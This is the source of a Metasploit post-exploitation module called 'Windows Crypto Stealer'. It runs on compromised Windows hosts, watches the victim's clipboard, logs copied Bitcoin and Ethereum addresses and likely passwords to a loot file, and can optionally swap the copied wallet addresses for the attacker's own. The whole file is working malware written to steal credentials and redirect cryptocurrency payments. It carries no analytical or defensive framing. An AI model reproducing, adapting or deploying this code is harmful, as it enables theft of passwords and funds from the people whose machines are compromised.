class MetasploitModule < Msf::Post
  include Msf::Post::Windows::ExtAPI

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'          => 'Windows Crypto Stealer',
        'Description'   => %q{
          Real-time clipboard monitor for Windows Meterpreter sessions.
          Detects copied crypto addresses (BTC, ETH) and potential passwords.
          Optionally replaces detected addresses.
        },
        'License'       => MIT_LICENSE,
        'Author'        => ['magarmach-hash'],
        'Platform'      => ['win'],
        'SessionTypes'  => ['meterpreter'],
        'Notes'         => {
          'Stability'   => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => []
        }
      )
    )

    register_options([
      OptBool.new('REPLACE',     [false, 'Replace detected addresses', false]),
      OptString.new('BTC_ADDRESS', [false, 'Replacement BTC address', '']),
      OptString.new('ETH_ADDRESS', [false, 'Replacement ETH address', '']),
      OptInt.new('INTERVAL',     [false, 'Poll interval in seconds', 2]),
      OptBool.new('LOG_TO_FILE', [false, 'Save captures to loot file', true]),
    ])
  end

  CRYPTO = {
    btc: { name: 'BTC', regex: /\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b/ },
    eth: { name: 'ETH', regex: /\b0x[a-fA-F0-9]{40}\b/ }
  }.freeze

  def is_password?(text)
    return false if text.nil? || text.strip.empty? || text.length < 8
    CRYPTO.each_value { |c| return false if text.match?(c[:regex]) }

    has_upper  = text.match?(/[A-Z]/)
    has_lower  = text.match?(/[a-z]/)
    has_digit  = text.match?(/[0-9]/)
    has_special = text.match?(/[^a-zA-Z0-9]/)

    return true if has_upper && has_lower && has_digit && has_special
    return true if has_upper && has_lower && has_digit && text.length >= 12
    false
  end

  def log_to_file(loot_path, label, data)
    return unless loot_path
    File.open(loot_path, 'a') { |f| f.puts("[#{Time.now}] #{label}: #{data}") }
  rescue => e
    print_error("Failed to write to loot file: #{e.message}")
  end

  def run
    unless session.extapi
      begin
        session.core.use('extapi')
      rescue Rex::TimeoutError
        fail_with(Failure::Timeout, 'Timed out loading extapi')
      rescue => e
        fail_with(Failure::Unknown, "extapi load failed: #{e.message}")
      end
    end

    interval = datastore['INTERVAL']
    replace  = datastore['REPLACE']
    btc_rep  = datastore['BTC_ADDRESS'].to_s.strip
    eth_rep  = datastore['ETH_ADDRESS'].to_s.strip

    if replace
      if btc_rep.empty? && eth_rep.empty?
        print_warning('REPLACE enabled but no replacement addresses set - disabling')
        replace = false
      end
    end

    loot = nil
    if datastore['LOG_TO_FILE']
      loot = store_loot('windows.crypto.stealer', 'text/plain', session, '',
                        'crypto_stealer_log.txt', 'Clipboard captures')
      print_status("Logging to: #{loot}")
    end

    count = 0
    last_text = nil

    print_status("Monitoring clipboard every #{interval}s (Ctrl+C to stop)")

    begin
      loop do
        begin
          data = session.extapi.clipboard.get_data
          text = nil

          if data.is_a?(Hash)
            # FIXED: iterate over hash values (keyed by timestamps), not format numbers
            data.each_value do |entry|
              if entry.is_a?(Hash) && entry['Text']
                text = entry['Text']
                break
              end
            end
          elsif data.is_a?(String) && !data.empty?
            text = data
          end

          if text && !text.empty? && text != last_text
            last_text = text
            matched = false

            CRYPTO.each do |key, coin|
              next unless (match_obj = text.match(coin[:regex]))

              matched = true
              addr = match_obj[0]
              count += 1
              print_good("[#{count}] #{coin[:name]}: #{addr}")
              log_to_file(loot, coin[:name], addr)

              if replace
                repl = (key == :btc) ? btc_rep : eth_rep
                next if repl.empty? || repl == addr

                new_text = text.gsub(addr, repl)
                session.extapi.clipboard.set_text(new_text)
                print_warning("  Replaced #{coin[:name]} address with #{repl}")
              end
            end

            if !matched && is_password?(text)
              count += 1
              print_good("[#{count}] POSSIBLE PASSWORD: #{text}")
              log_to_file(loot, 'PASSWORD', text)
            end
          end
        rescue Rex::TimeoutError
          # normal timeout, just retry
        rescue => e
          print_error("Clipboard error: #{e.message}")
        end

        sleep(interval)
      end
    rescue SystemExit, Interrupt
      print_status("Clipboard monitor stopped. Total captures: #{count}")
      print_status("Log file: #{loot}") if loot && count > 0
    end
  end
end
